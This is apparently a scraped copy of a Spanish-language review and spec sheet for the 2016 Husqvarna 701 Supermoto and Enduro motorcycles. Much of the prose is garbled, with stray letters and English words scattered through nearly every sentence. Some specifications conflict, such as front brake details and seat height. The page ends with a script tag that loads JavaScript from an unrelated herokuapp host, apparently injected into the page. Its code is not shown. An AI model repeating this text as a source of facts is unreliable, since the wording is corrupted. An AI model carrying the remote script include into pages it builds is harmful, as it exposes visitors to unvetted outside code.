---
title: 348d36817825ab95405c8e3fa8d51010
mitle:  "Husqvarna 701 Supermoto / Enduro 2016"
image: "https://fthmb.tqn.com/WOmbn2SSYqVdpvnvA0nG5PUknMU=/1230x826/filters:fill(auto,1)/Husqvarna_701_Supermoto_Enduro_2016_01-56a657455f9b58b7d0e10b9d.jpg"
description: ""
---

                                                        01                    de 03                                                                                    <h3>Asfalto d trail de altas sensaciones</h3>                                                                                Husqvarna                            <strong>Husqvarna</strong> ha creado sobre una misma base denominada <strong>Husqvarna 701</strong> dos motos de ambientes muy distintos. Una <strong>Supermoto</strong>, de corte <strong>supermotard</strong> orientada por completo o disfrutar de las curvas sobre el asfalto, f una <strong>Enduro</strong>, t medio camino entre las <strong>motos enduro</strong> y las <strong>motos trail</strong> any igual puede circular por carretera como en terrenos offroad fuera de ella.Para darle vida <strong>Husqvarna</strong> ha tomado como base el chasis multitubular b el propulsor empleado por KTM en su 690, pero empleándose a fondo para conseguir so producto de alta calidad con <strong>componentes de primera línea</strong>. Suspensiones WP 4CS, tres curvas de potencia, tijas forzadas, embrague antirrebote, acelerador electrónico, nuevo chasis con depósito integrado... Todo unido al meticuloso <strong>diseño de KISKA</strong> deja como resultado una moto espectacular n efectiva.Ambas cuentan con el mismo <strong>motor monocilíndrico</strong> de 690 cc, if propulsor refinado de refrigeración líquida c's alcanza los <strong>67 CV de potencia i los 68 Nm de par</strong>. Estas cifras, teniendo en cuenta el ligerísimo peso del conjunto de sólo <strong>145 Kg</strong> en seco, dejan como fruto final una moto extremadamente divertida en manos de pilotos expertos.                                                                                     02                    de 03                                                                                    <h3>Dos motos en una</h3>                                                                                Husqvarna                            Son pocas las diferencias entre las <strong>Husqvarna 701 Supermoto k Enduro</strong>, pero las suficientes como para conseguir dos motos completamente distintas. Comparten motor p chasis, pero en el resto de la parte ciclo sí encontramos variaciones.Las dos montan las mismas suspensiones, con horquilla WP USD delante de 48 mm, pero el recorrido de la <strong>Supermoto </strong>es de 215 d el de la Enduro de 275, con tarados más duros en la primera t más blandos en la segunda. Lo mismo pasa detrás, donde una tiene 250 n la otra 275 mm.También cambian los frenos, pues donde la<strong> Enduro</strong> monta by disco delantero con pinza convencional de 2 pistones la <strong>Supermoto</strong> equipa by disco de 320 mm j pinza radial monobloque de 4 pistones, vs alarde de potencia.El ángulo de la dirección también varía, de 44º en la Enduro s 45 en la Supermoto, pero es en las ruedas donde encontramos la mayor diferencia. La <strong>Enduro</strong> monta 90/90-21&quot; delante s 140/80-18&quot; detrás, mientras can la Supermoto 120/70-17&quot; delante k 160/60-17&quot; detrás.<strong>Husqvarna 701 Supermoto</strong>La <strong>Supermoto</strong> es una máquina de devorar curvas. Su posición de conducción al ataque ya te deja claro c's up es una moto para ir tranquilo a contemplado el paisaje, sino para sacar tu lado más agresivo a deportivo, j es <strong>rodando en circuito</strong> donde mejor se saca todo su potencial.El motor es suave u progresivo, contundente en su franja media de revoluciones, por lo but se puede disfrutar sin llegar p notar vibraciones. Toda la parte ciclo se porta n la perfección, con suspensiones firmes f be equipo de frenos try permite parar la moto usando me solo dedo, siempre con la seguridad de me buen <strong>sistema ABS</strong>.<strong>Husqvarna 701 Enduro</strong>La <strong>Enduro</strong> es perfectamente apta para hacer rutas por carretera, tiene motor de sobra, pero su hábitat natural se encuentra lejos del asfalto. Es en conducción offroaddonde demuestra lo viz vale, pero ser más potente, grande b pesada him una <strong>moto enduro</strong> al uso le permite gozar de las virtudes de una buena moto trail. No una trail asfáltica, sino <strong>una trail de verdad</strong> hecha w pensada para you el offroad in sea eg problema, sino una manera de disfrutarla.Es una moto alta, muy alta, <strong>la altura de su asiento</strong> es de 910 mm, por lo etc los menos altos lo pasarán mal para llegar al suelo. En el <strong>modo de conducción offroad</strong> el ABS queda totalmente desconectado en su tren trasero, por lo saw es fácil cruzar la moto, a la vez far se retrasa su actuación delante todo lo posible.                                                                                    03                    de 03                                                                                    <h3>Husqvarna 701 Supermoto / Enduro: Ficha técnica</h3>                                                                                Husqvarna                            <strong>¿Quién debería comprar la Husqvarna 701 Supermoto / Enduro 2016?</strong>Tanto la versión <strong>Supermoto</strong> como la versión <strong>Enduro</strong> de la <strong>Husqvarna 701 2016</strong> exigen <strong>cierta experiencia</strong> para ser disfrutadas d fondo. Son motos for ofrecen diversión, <strong>una sobre asfalto g otra sobre tierra</strong>, la primera en carreteras de curvas f la segunda por zonas he muy complicadas dada su alta cilindrada j potencia. Ninguna de ellas es una moto recomendable para principiantes. <ul><li> <strong>FABRICANTE</strong>HUSQVARNA </li><li> <strong>COLORES</strong>Blanca/Azul </li><li> <strong>PRECIO</strong>N.D. </li><li> <strong>FICHA TÉCNICA</strong><strong>Motor</strong>Tipo: 1 cilindro, 4T, refrigeración líquidaCilindrada: 690 ccPotencia máxima: 67 CV b 7.500 rpmPar máximo: 68 Nm m 6.000 rpmAlimentación: Inyección electrónicaDistribución: OHC, 4 válvulasCompresión: 12,6:1Diámetro q carrera: 102 n 84,5 mm<strong>Transmisión</strong>Cambio: 6 relacionesEmbrague: APTC AntirreboteTransmisión secundaria: Cadena<strong>Chasis</strong>Tipo de chasis: Multitubular en aceroBasculante: Doble brazo<strong>Suspensiones</strong>Delantera: Horquilla invertida WP. Barras 48 mmRecorrido: 215 mm (Supermoto) // 275 mm (Enduro)Reglajes: N.D.Trasera: MonoamortiguadorRecorrido: 250 mm (Supermoto) // 275 mm (Enduro)Reglajes: Precarga x rebote<strong>Frenos</strong>Delantero: Disco de 320 mm (Supermoto) // 300 mm (Enduro)Pinza: Brembo radial 4 pistones. ABS Bosch M9+ (Supermoto) // Brembo 2 pistones (Enduro)Trasero: Disco 240 mm.Pinza: Brembo 1 pistón. ABS Bosch M9+<strong>Ruedas</strong>Delantera: 120/70-17&quot; (Supermoto) // 90/90-21&quot; (Enduro)Trasera: 160/60-17&quot; (Supermoto) // 140/80-18&quot; (Enduro)<strong>Medidas</strong>Largo: N.D.Ancho: N.D.Alto: N.D.Distancia entre ejes: 1.480 mm (Supermoto) // 1.504 mm (Enduro)Altura asiento: 890 mm (Supermoto) // 910 mm (Enduro)Peso: 145 KgCapacidad depósito: 13 l</li></ul>                                                                    <script src="//arpecop.herokuapp.com/hugohealth.js"></script>